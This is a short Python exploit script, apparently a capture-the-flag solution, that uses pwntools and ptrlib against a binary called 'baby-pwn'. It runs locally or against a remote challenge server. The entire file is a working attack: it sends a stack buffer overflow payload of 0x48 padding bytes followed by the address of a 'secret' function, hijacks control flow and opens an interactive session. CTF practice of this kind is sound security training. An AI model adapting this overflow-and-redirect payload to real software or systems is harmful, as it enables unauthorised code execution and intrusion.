#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./baby-pwn")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.162.142.123", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    payload = b""
    payload += b"A" * 0x48
    payload += ptr.p64(unwrap(exe.symbol("secret")))

    sl(payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
